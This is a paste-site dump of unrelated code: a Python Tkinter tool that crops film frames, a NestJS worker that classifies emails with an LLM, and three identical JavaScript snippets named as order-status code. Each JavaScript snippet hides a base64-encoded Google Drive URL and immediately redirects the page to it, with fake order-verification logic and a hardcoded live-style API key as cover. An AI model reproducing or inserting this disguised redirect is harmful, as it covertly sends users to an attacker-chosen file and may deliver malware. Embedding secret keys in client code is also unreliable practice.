    Returns:
        list: Cropped frames as numpy arrays.
    """"""
    try:
        sprocket_count = 0
        cropped_frames = []

        original_image = load_image(image_path)
        if original_image is None:
            debug_print(f""‚ùå Error loading image: {image_path}"")
            return []

        rotated_image = cv2.rotate(original_image, cv2.ROTATE_180)
        gray = cv2.cvtColor(rotated_image, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, threshold_value, 255, cv2.THRESH_BINARY)
        cnts, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        debug_print(f""üõ† Found {len(cnts)} contours."")

        # Sort contours by x-coordinate (right to left), and for matching x-values, sort by y (top to bottom)
        cnts = sorted(cnts, key=lambda x: (cv2.boundingRect(x)[0], -cv2.boundingRect(x)[1]), reverse=True)
        
        # **Validation debug print** - Check the order of sorted contours
        for idx, c in enumerate(cnts):
            x, y, w, h = cv2.boundingRect(c)
            debug_print(f""üîç Contour {idx}: x={x}, y={y}, w={w}, h={h}"")
            

        for c in cnts:
            x, y, w, h = cv2.boundingRect(c)
            aspect_ratio = w / float(h)
            if 0.2 < aspect_ratio < 1.0 and w < 300 and h > 50:
                sprocket_count += 1
                debug_print(f""üî¥ Sprocket #{sprocket_count}: x={x}, y={y}, w={w}, h={h}"")
                frame_x = max(x + frame_x_offset, 0)
                frame_y = max(y - frame_y_offset, 0)
                frame_w = min(frame_width_max, rotated_image.shape[1] - frame_x)
                frame_h = min(frame_height_max, rotated_image.shape[0] - frame_y)
                debug_print(f""üìå Cropping frame: x={frame_x}, y={frame_y}, w={frame_w}, h={frame_h}"")
                frame = rotated_image[frame_y:frame_y + frame_h, frame_x:frame_x + frame_w]
                debug_print(f""Appending frame: x={frame_x}, y={frame_y}, w={frame_w}, h={frame_h}"")
                if frame.size > 0:
                    cropped_frames.append(frame)
                else:
                    debug_print(""‚ö†Ô∏è Skipped empty frame."")

        debug_print(f""‚úÖ Sprocket count: {sprocket_count}, frames before skip: {len(cropped_frames)}"")
        if cropped_frames:
            debug_print(""üîß Skipping first cropped frame (likely unwanted)."")
            cropped_frames = cropped_frames[1:]
        debug_print(f""‚úÖ Final cropped frames count: {len(cropped_frames)}"")
        return cropped_frames

    except cv2.error as e:
        debug_print(f""‚ùå OpenCV error in detect_and_crop_frames: {e}"")
        return []
    except Exception as e:
        debug_print(f""‚ùå Unexpected error in detect_and_crop_frames: {e}"")
        return []

# =============================================================================
# GUI Update Functions
# =============================================================================
def update_preview():
    """"""
    Updates the preview image on the canvas.
    Loads the first image from the input folder and applies rotation, thresholding,
    and optional overlay drawing.
    """"""
    global update_pending, update_requested, image_display, processed_image
    if update_pending:
        return
    update_pending = True

    # Show the preview loading overlay
    loading_label.grid(row=0, column=0, sticky=""nsew"")
    root.update_idletasks()  # Ensure UI is updated immediately

    try:
        # Use the first file in the input folder for preview
        if input_folder and os.listdir(input_folder):
            sample_file = os.path.join(input_folder, sorted(os.listdir(input_folder))[0])
        else:
            debug_print(""‚ö†Ô∏è No image available for preview."")
            return

        debug_print(f""üõ† Loading image for preview: {sample_file}"")
        original_image = load_image(sample_file)
        if original_image is None:
            debug_print(f""‚ùå Error loading preview image: {sample_file}"")
            return

        rotated_image = cv2.rotate(original_image, cv2.ROTATE_180)
        debug_print(f""üü¢ Display mode: {display_mode.get()}"")

        # Apply threshold for contour detection
        gray = cv2.cvtColor(rotated_image, cv2.COLOR_BGR2GRAY)
        _, thresh = cv2.threshold(gray, threshold_value, 255, cv2.THRESH_BINARY)
        cnts, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        debug_print(f""üõ† Detected {len(cnts)} contours."")

        # Choose the base image for preview depending on display mode
        if display_mode.get() == ""Threshold Image"":
            base_image = cv2.cvtColor(thresh, cv2.COLOR_GRAY2BGR)
            debug_print(""üñ§ Using Threshold Image mode."")
        else:
            base_image = rotated_image
            debug_print(""üñº Using Original Image mode."")

        # If overlay is enabled, draw the detection overlay
        if overlay_enabled.get():
            debug_print(""üü¢ Overlay enabled."")
            overlay = base_image.copy()
            sprocket_count = 0
            for c in cnts:
                x, y, w, h = cv2.boundingRect(c)
                aspect_ratio = w / float(h)
                if 0.2 < aspect_ratio < 1.0 and w < 300 and h > 50:
                    sprocket_count += 1
                    debug_print(f""üî¥ Sprocket: x={x}, y={y}, w={w}, h={h} (Count: {sprocket_count})"")
                    frame_x = max(x + frame_x_offset, 0)
                    frame_y = max(y - frame_y_offset, 0)
                    frame_w = min(frame_width_max, rotated_image.shape[1] - frame_x)
                    frame_h = min(frame_height_max, rotated_image.shape[0] - frame_y)
                    box_color = (0, 255, 0) if sprocket_count % 2 == 0 else (255, 0, 0)
                    box_overlay = overlay.copy()
                    cv2.rectangle(box_overlay, (frame_x, frame_y),
                                  (frame_x + frame_w, frame_y + frame_h),
                                  box_color, -1)
                    cv2.addWeighted(box_overlay, 0.3, overlay, 0.7, 0, overlay)
            valid_frames = sprocket_count - 1 if sprocket_count > 0 else 0
            frame_count_label.config(
                text=f""[ {valid_frames} (+1 rubbish) ] Frame(s) Detected, [ {sprocket_count} ] Sprocket(s) Detected""
            )
            base_image = overlay
        else:
            debug_print(""üî¥ Overlay disabled."")

        # Resize for preview (scale factor 0.2)
        scale_factor = 0.2
        preview_resized = cv2.resize(base_image,
                                     (int(base_image.shape[1] * scale_factor),
                                      int(base_image.shape[0] * scale_factor)))
        debug_print(f""üñº Resized preview dimensions: {preview_resized.shape}"")
        processed_image = cv2.cvtColor(preview_resized, cv2.COLOR_BGR2RGB)
        image_display = ImageTk.PhotoImage(image=Image.fromarray(processed_image))
        preview_canvas.create_image(0, 0, anchor='nw', image=image_display)
        preview_canvas.config(scrollregion=preview_canvas.bbox('all'))
        debug_print(""üìå Preview updated."")
    except Exception as e:
        debug_print(f""‚ùå Error in update_preview: {e}"")
    finally:
        update_pending = False
        loading_label.grid_forget()  # Hide the loading overlay
        if update_requested:
            update_requested = False
            threading.Thread(target=update_preview, daemon=True).start()

def update_threshold(value):
    """"""
    Updates the threshold value used for processing, using a 0.3-second debounce.
    """"""
    global threshold_value, debounce_time, threshold_label, update_pending, update_requested
    current_time = time.time()
    if current_time - debounce_time < 0.3:
        return
    debounce_time = current_time
    with lock:
        threshold_value = int(value)
    debug_print(f""üîß Threshold updated to: {threshold_value}"")
    if threshold_label is not None:
        threshold_label.config(text=f""Threshold: {threshold_value}"")
    if update_pending:
        update_requested = True
    else:
        threading.Thread(target=update_preview, daemon=True).start()

def reset_gui():
    """"""
    Resets the GUI state for a new run.
    Clears the preview and resets frame and sprocket counts.
    """"""
    global processed_count, frame_counter
    processed_count = 0
    frame_counter = 1
    frame_count_label.config(text=""[ 0 ] Frame(s) Detected, [ 0 ] Sprocket(s) Detected"")
    preview_canvas.delete(""all"")
    debug_print(""üîÑ GUI reset for a new run."")

def select_input_folder():
    """"""
    Opens a dialog to select the input folder.
    Updates the input folder label and refreshes the preview.
    """"""
    global input_folder
    selected = filedialog.askdirectory(title=""Select Input Folder"")
    if selected:
        input_folder = selected
        input_folder_label.config(text=""Input: "" + os.path.basename(input_folder))
    else:
        input_folder_label.config(text=""Input: Not Selected"")
    threading.Thread(target=update_preview, daemon=True).start()

def select_output_folder():
    """"""
    Opens a dialog to select the output folder and updates the folder label.
    """"""
    global output_folder
    selected = filedialog.askdirectory(title=""Select Output Folder"")
    if selected:
        output_folder = selected
        output_folder_label.config(text=""Output: "" + os.path.basename(output_folder))
    else:
        output_folder_label.config(text=""Output: Not Selected"")

# =============================================================================
# Loading Dialog / Progress Indicator Functions
# =============================================================================
def show_loading_dialog():
    """"""
    Displays a modal dialog with an indeterminate progress bar and a
    'Stop Processing' button. Resets the stop flag.
    """"""
    global loading_window, stop_requested
    stop_requested = False  # Reset for a new processing run
    loading_window = tk.Toplevel(root)
    loading_window.title(""Processing..."")
    tk.Label(loading_window, text=""Processing, please wait..."").grid(row=0, column=0, padx=10, pady=10)
    progress = ttk.Progressbar(loading_window, mode='indeterminate', length=200)
    progress.grid(row=1, column=0, padx=10, pady=10)
    progress.start()
    ttk.Button(loading_window, text=""Stop Processing"", command=stop_processing).grid(row=2, column=0, pady=10)
    loading_window.grab_set()  # Make the dialog modal

def stop_processing():
    """"""
    Signals the processing loop to stop, resets counters and clears the preview,
    then hides the loading dialog.
    """"""
    global stop_requested, processed_count, frame_counter
    stop_requested = True
    processed_count = 0
    hide_loading_dialog()
    preview_canvas.delete(""all"")
    frame_count_label.config(text=""[ 0 ] Frame(s) Detected, [ 0 ] Sprocket(s) Detected"")
    debug_print(""‚èπÔ∏è Processing stopped and state reset."")

def hide_loading_dialog():
    """"""Closes the loading dialog if it exists.""""""
    global loading_window
    if loading_window is not None:
        loading_window.destroy()
        loading_window = None

def processing_complete_dialog(total_strips, total_frames):
    """"""
    Hides the loading dialog and shows a message box indicating
    that processing is complete.
    """"""
    hide_loading_dialog()
    messagebox.showinfo(""Processing Complete"", f""Processed {total_strips} strips.\nTotal frames saved: {total_frames}"")

# =============================================================================
# Image Saving Function
# =============================================================================
def save_detected_frames(detected_frames, strip_filename):
    """"""
    Saves each detected frame after rotating 90¬∞ counterclockwise and flipping vertically.
    **Now ensures frames are saved in the correct order by reversing the list before saving.**
    Returns:
        int: Number of frames saved.
    """"""
    global frame_counter
    frames_saved = 0

    # ‚úÖ Reverse the order of detected frames before saving
    detected_frames.reverse()

    try:
        for idx, frame in enumerate(detected_frames):
            if frame is None or not isinstance(frame, np.ndarray):
                debug_print(f""‚ùå Invalid frame at index {idx}; skipping."")
                continue

            rotated_frame = cv2.rotate(frame, cv2.ROTATE_90_COUNTERCLOCKWISE)
            flipped_frame = cv2.flip(rotated_frame, 0)
            filename = os.path.join(output_folder, f""frame_{frame_counter:06d}.jpg"")
            cv2.imwrite(filename, flipped_frame, [cv2.IMWRITE_JPEG_QUALITY, 100])

            debug_print(f""‚úÖ Frame saved: {filename}"")
            frame_counter += 1
            frames_saved += 1

        print(f""Strip {strip_filename}: Frames saved: {frames_saved}"")
        return frames_saved

    except cv2.error as e:
        debug_print(f""‚ùå OpenCV error when saving frames: {e}"")
        return frames_saved
    except OSError as e:
        debug_print(f""‚ùå OS error when saving frames: {e}"")
        return frames_saved
    except Exception as e:
        debug_print(f""‚ùå Unexpected error when saving frames: {e}"")
        return frames_saved

# =============================================================================
# Process Image Queue Function
# =============================================================================
def process_image_queue():
    """"""
    Processes all images in the input folder by detecting and cropping frames.
    Introduces a waiting period before starting to allow cancellation.
    If uninterrupted, shows a processing complete dialog.
    """"""
    global image_queue, processed_count, frame_counter, stop_requested

    if not input_folder or not output_folder:
        messagebox.showerror(""Error"", ""Please select both input and output folders before starting the process."")
        hide_loading_dialog()
        return

    image_queue = sorted(
        [os.path.join(input_folder, f)
         for f in os.listdir(input_folder)
         if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
    )
    if not image_queue:
        messagebox.showerror(""Error"", ""No valid images found in the input folder."")
        hide_loading_dialog()
        return

    if stop_requested:
        debug_print(""üõë Processing stopped before starting the loop."")
        hide_loading_dialog()
        return

    debug_print(""‚è≥ Waiting for user input before starting..."")
    for _ in range(20):  # 20 iterations x 0.1 s delay = 2 seconds
        if stop_requested:
            debug_print(""üõë Processing stopped before it began."")
            hide_loading_dialog()
            return
        time.sleep(0.1)

    total_strips = 0
    for image_path in image_queue:
        if stop_requested:
            debug_print(""üõë Processing stopped by user."")
            break
        total_strips += 1
        debug_print(f""üîç Processing strip: {image_path}"")
        try:
            cropped_frames = detect_and_crop_frames(image_path)
            if not cropped_frames:
                debug_print(f""‚ö†Ô∏è No frames detected in {image_path}. Skipping."")
                continue
            for idx, frame in enumerate(cropped_frames):
                debug_print(f""Frame order before saving: index={idx}, size={frame.shape}"")
            frames_saved = save_detected_frames(cropped_frames, os.path.basename(image_path))
            processed_count += 1
        except Exception as e:
            debug_print(f""‚ùå Error processing {image_path}: {e}"")

    debug_print(""‚úÖ Processing loop completed."")
    if not stop_requested:
        root.after(0, lambda: processing_complete_dialog(total_strips, frame_counter - 1))

# =============================================================================
# Tkinter GUI Setup
# =============================================================================
root = tk.Tk()
root.title(""CineFrame Cutter"")
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(0, weight=1)

main_frame = Frame(root)
main_frame.grid(row=0, column=0, sticky='nsew')
main_frame.grid_rowconfigure(0, weight=1)
main_frame.grid_columnconfigure(0, weight=1)

# Input/Output Folder Selection Panel
io_frame = Frame(main_frame, relief=tk.RIDGE, borderwidth=2)
io_frame.grid(row=0, column=0, sticky='ew', padx=5, pady=5)
io_frame.columnconfigure(1, weight=1)
input_folder_label = Label(io_frame, text=""Input: Not Selected"")
input_folder_label.grid(row=0, column=0, padx=5, pady=5)
ttk.Button(io_frame, text=""Browse Input"", command=select_input_folder).grid(row=0, column=1, padx=5, pady=5)
output_folder_label = Label(io_frame, text=""Output: Not Selected"")
output_folder_label.grid(row=1, column=0, padx=5, pady=5)
ttk.Button(io_frame, text=""Browse Output"", command=select_output_folder).grid(row=1, column=1, padx=5, pady=5)

# Image Preview Frame (600x450)
preview_frame = Frame(main_frame, relief=tk.SUNKEN, borderwidth=2)
preview_frame.grid(row=1, column=0, sticky='nsew', padx=5, pady=5)
preview_frame.grid_rowconfigure(0, weight=1)
preview_frame.grid_columnconfigure(0, weight=1)
preview_canvas = Canvas(preview_frame, bg='white', width=600, height=450)
preview_canvas.grid(row=0, column=0, sticky='nsew')
h_scroll = Scrollbar(preview_frame, orient=tk.HORIZONTAL, command=preview_canvas.xview)
h_scroll.grid(row=1, column=0, sticky='ew')
v_scroll = Scrollbar(preview_frame, orient=tk.VERTICAL, command=preview_canvas.yview)
v_scroll.grid(row=0, column=1, sticky='ns')
preview_canvas.configure(xscrollcommand=h_scroll.set, yscrollcommand=v_scroll.set)
loading_label = Label(preview_frame, text=""Loading preview..."", font=(""Arial"", 14), fg=""red"", bg=""white"")
loading_label.grid(row=0, column=0, sticky=""nsew"")
loading_label.grid_forget()  # Hide the loading overlay by default

# Frame and Sprocket Count Label
frame_count_label = Label(main_frame, text=""[ 0 ] Frame(s) Detected, [ 0 ] Sprocket(s) Detected"", font=(""Arial"", 12))
frame_count_label.grid(row=2, column=0, padx=5, pady=5)

# Controls Panel (Threshold, Display Mode, Overlay, Frame Area Adjusters)
controls_frame = Frame(main_frame, relief=tk.GROOVE, borderwidth=2)
controls_frame.grid(row=3, column=0, sticky='ew', padx=5, pady=5)
controls_frame.columnconfigure(0, weight=1)
threshold_label = Label(controls_frame, text=f""Threshold: {threshold_value}"", font=(""Arial"", 10))
threshold_label.grid(row=0, column=0, padx=5, pady=5, sticky='w')
threshold_slider = ttk.Scale(controls_frame, from_=0, to=255, orient='horizontal',
                             command=lambda v: update_threshold(int(float(v))))
threshold_slider.set(threshold_value)
threshold_slider.grid(row=0, column=1, padx=5, pady=5, sticky='ew')
controls_frame.columnconfigure(1, weight=1)
Label(controls_frame, text=""Display Mode:"").grid(row=1, column=0, padx=5, pady=5, sticky='w')
display_mode = tk.StringVar(value=""Threshold Image"")
display_dropdown = ttk.OptionMenu(controls_frame, display_mode, ""Threshold Image"", ""Threshold Image"", ""Original Image"")
display_dropdown.grid(row=1, column=1, padx=5, pady=5, sticky='ew')
display_mode.trace_add(""write"", lambda *args: threading.Thread(target=update_preview, daemon=True).start())
overlay_enabled = tk.BooleanVar(value=True)
overlay_checkbox = ttk.Checkbutton(controls_frame, text=""Enable Overlay"", variable=overlay_enabled,
                                   command=lambda: threading.Thread(target=update_preview, daemon=True).start())
overlay_checkbox.grid(row=2, column=0, padx=5, pady=5, sticky='w')

# Frame Area Adjustment Controls
area_frame = Frame(controls_frame, relief=tk.RIDGE, borderwidth=1)
area_frame.grid(row=3, column=0, columnspan=2, sticky='ew', padx=5, pady=5)
Label(area_frame, text=""Frame X Offset:"").grid(row=0, column=0, padx=3, pady=3, sticky='w')
x_offset_spin = Spinbox(area_frame, from_=0, to=500, width=5)
x_offset_spin.delete(0, tk.END)
x_offset_spin.insert(0, frame_x_offset)
x_offset_spin.grid(row=0, column=1, padx=3, pady=3)
Label(area_frame, text=""Frame Y Offset:"").grid(row=0, column=2, padx=3, pady=3, sticky='w')
y_offset_spin = Spinbox(area_frame, from_=0, to=500, width=5)
y_offset_spin.delete(0, tk.END)
y_offset_spin.insert(0, frame_y_offset)
y_offset_spin.grid(row=0, column=3, padx=3, pady=3)
Label(area_frame, text=""Max Width:"").grid(row=1, column=0, padx=3, pady=3, sticky='w')
width_spin = Spinbox(area_frame, from_=100, to=2000, width=5)
width_spin.delete(0, tk.END)
width_spin.insert(0, frame_width_max)
width_spin.grid(row=1, column=1, padx=3, pady=3)
Label(area_frame, text=""Max Height:"").grid(row=1, column=2, padx=3, pady=3, sticky='w')
height_spin = Spinbox(area_frame, from_=100, to=3000, width=5)
height_spin.delete(0, tk.END)
height_spin.insert(0, frame_height_max)
height_spin.grid(row=1, column=3, padx=3, pady=3)
def refresh_preview():
    """"""
    Updates global cropping parameters from the spinboxes,
    then refreshes the preview.
    """"""
    global frame_x_offset, frame_y_offset, frame_width_max, frame_height_max
    try:
        frame_x_offset = int(x_offset_spin.get())
        frame_y_offset = int(y_offset_spin.get())
        frame_width_max = int(width_spin.get())
        frame_height_max = int(height_spin.get())
        debug_print(f""Updated frame area: x_offset={frame_x_offset}, y_offset={frame_y_offset}, ""
                    f""width_max={frame_width_max}, height_max={frame_height_max}"")
        threading.Thread(target=update_preview, daemon=True).start()
    except Exception as e:
        debug_print(f""Error refreshing preview: {e}"")
refresh_button = ttk.Button(area_frame, text=""Apply Frame Size"", command=refresh_preview)
refresh_button.grid(row=2, column=0, columnspan=4, pady=5)

# Bottom Control Panel (Start, Quit, Reset Buttons)
buttons_frame = Frame(main_frame)
buttons_frame.grid(row=4, column=0, sticky='ew', padx=5, pady=5)
buttons_frame.grid_columnconfigure(3, weight=1)  # Spacer column to right-align the Quit button

start_button = ttk.Button(
    buttons_frame,
    text=""Start"",
    command=lambda: [show_loading_dialog(),
                     threading.Thread(target=process_image_queue, daemon=True).start()]
)
start_button.grid(row=0, column=0, padx=5, pady=5)

quit_button = ttk.Button(buttons_frame, text=""Quit"", command=root.destroy)
quit_button.grid(row=0, column=3, padx=5, pady=5, sticky='e')  # Placed in far-right column

def confirm_reset():
    """"""Prompts the user to confirm before resetting the GUI.""""""
    if messagebox.askyesno(""Confirm Reset"", ""Are you sure you want to reset the GUI for a new run?""):
        reset_gui()
reset_button = ttk.Button(buttons_frame, text=""Reset GUI"", command=confirm_reset)
reset_button.grid(row=0, column=2, padx=5, pady=5)

# =============================================================================
# Main Event Loop
# =============================================================================
try:
    root.mainloop()
except KeyboardInterrupt:
    debug_print(""üõë Keyboard Interrupt: Exiting."")
"
kF5eECma,Untitled,navrajkhunger,JavaScript,Thursday 10th of April 2025 05:33:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91869/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KdBXQCAG,Products.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 05:18:02 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75231/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
R8baELvX,worker,Uno2K,TypeScript,Thursday 10th of April 2025 05:10:17 PM CDT,"import { Processor, WorkerHost, InjectQueue } from '@nestjs/bullmq';
import { Job, Queue } from 'bullmq';
import { OpenAIService } from '../../infrastructure/openai/openai.service';
import { Logger } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { z } from 'zod';
import zodToJsonSchema from 'zod-to-json-schema';

// TODO: Some emails are failing to be classified.
/**
 * [Nest] 46190  - 04/10/2025, 6:42:23 PM   ERROR [CategorizationWorker] Failed to process categorization job 289: 429 status code (no body)
 * Error: 429 status code (no body)
 */

const systemPrompt = `
Act as an email classification expert. Classify the following email message into one of the following categories:

1 (To respond): Emails you need to respond to.
2 (FYI): Emails that don't require your response, but are important.
3 (Comment): Team chats in tools like Google Docs or Microsoft Office.
4 (Notification): Automated updates from tools you use.
5 (Meeting update): Calendar updates from Zoom, Google Meet, etc.
6 (Awaiting reply): Emails you've sent that you're expecting a reply to.
7 (Actioned): Emails you've sent that you're not expecting a reply to.
8 (Marketing): Marketing or cold emails.

Consider the following metadata provided as variables:

{
  ""sender"": ""{sender}"",
  ""subject"": ""{subject}"",
  ""body"": ""{body}"",
  ""labels"": ""{labels}"",
  ""attachments"": ""{attachments}"",
  ""date"": ""{date}"",
  ""recipients"": ""{recipients}""
}

Provide a confidence score (from 0 to 1) for your classification:
category: the classification category (as a name),
confidence: the confidence score,
reason: the reason for the classification.
`;

const emailClassificationSchema = z.object({
  category: z.enum([
    'To respond',
    'FYI',
    'Comment',
    'Notification',
    'Meeting update',
    'Awaiting reply',
    'Actioned',
    'Marketing',
  ]),
  confidence: z.number(),
  reason: z.string(),
});

interface CategorizationJobData {
  userId: string;
  emailId: string;
  subject: string;
  from: string;
  date: string;
  emailBody: string;
  labels: string[];
}

@Processor('categorization-queue')
export class CategorizationWorker extends WorkerHost {
  private readonly logger = new Logger(CategorizationWorker.name);

  constructor(
    @InjectQueue('summarization-queue')
    private readonly summarizationQueue: Queue,
    @InjectQueue('label-adding-queue')
    private readonly labelAddingQueue: Queue,
    private readonly openaiService: OpenAIService,
    private readonly configService: ConfigService,
  ) {
    super();
  }

  async process(job: Job<CategorizationJobData>): Promise<any> {
    this.logger.log(`Starting categorization for job: ${job.id}`);
    try {
      const openai = this.openaiService.getClient();

      // GPT 4o-mini
      const response = await openai.responses.create({
        model: this.configService.get<string>('openai.model') as string,
        input: [
          { role: 'system', content: systemPrompt },
          {
            role: 'user',
            content: `<email_from>${job.data.from}</email_from>
                      <email_subject>${job.data.subject}</email_subject>
                      <email_content>${job.data.emailBody}</email_content>
                      <email_labels>${job.data.labels.join(', ')}</email_labels>`,
          },
        ],
        text: {
          format: {
            type: 'json_schema',
            name: 'email_classification',
            schema: zodToJsonSchema(emailClassificationSchema),
          },
        },
      });

      // Gemini 2.0 Flash
      // const response = await openai.chat.completions.create({
      //   model: this.configService.get<string>('openai.model') as string,
      //   messages: [
      //     { role: 'system', content: systemPrompt },
      //     {
      //       role: 'user',
      //       content: `<email_from>${job.data.from}</email_from>
      //                 <email_subject>${job.data.subject}</email_subject>
      //                 <email_body>${job.data.emailBody}</email_body>
      //                 <email_labels>${job.data.labels.join(', ')}</email_labels>`,
      //     },
      //   ],
      //   response_format: zodResponseFormat(
      //     emailClassificationSchema,
      //     'email_classification',
      //   ),
      // });

      if (!response.output_text) {
        this.logger.error(`Empty response from OpenAI for job: ${job.id}`);
        throw new Error('Empty response from OpenAI');
      }

      // if (!response.choices[0].message.content) {
      //   this.logger.error(`Empty response from OpenAI for job: ${job.id}`);
      //   throw new Error('Empty response from OpenAI');
      // }

      // const parsedOutput: unknown = JSON.parse(
      //   response.choices[0].message.content,
      // );

      const parsedOutput: unknown = JSON.parse(response.output_text);

      const classificationEmail = emailClassificationSchema.parse(parsedOutput);

      const categorizationResult = {
        category: classificationEmail.category,
        confidence: classificationEmail.confidence,
        reason: classificationEmail.reason,
      };

      this.logger.log(
        `Categorization for job ${job.id}:`,
        categorizationResult,
      );

      await this.labelAddingQueue.add('add-label', {
        userId: job.data.userId,
        emailId: job.data.emailId,
        category: categorizationResult.category,
      });

      // Next step: enqueue a summarization job with the categorization result
      // await this.summarizationQueue.add('summarize-email', {
      //   emailId: job.data.emailId,
      //   ...categorizationResult,
      //   subject: job.data.subject,
      //   from: job.data.from,
      //   date: job.data.date,
      //   emailBody: job.data.emailBody,
      // });

      return {
        message: `Categorization job ${job.id} completed successfully.`,
        result: categorizationResult,
      };
    } catch (error) {
      this.logger.error(
        `Failed to process categorization job ${job.id}: ${error instanceof Error ? error.message : 'Unknown error'}`,
        error instanceof Error ? error.stack : undefined,
      );
      throw error;
    }
  }
}
"
hS4Q2Pra,Order.js,navrajkhunger,JavaScript,Thursday 10th of April 2025 05:02:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/17104/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
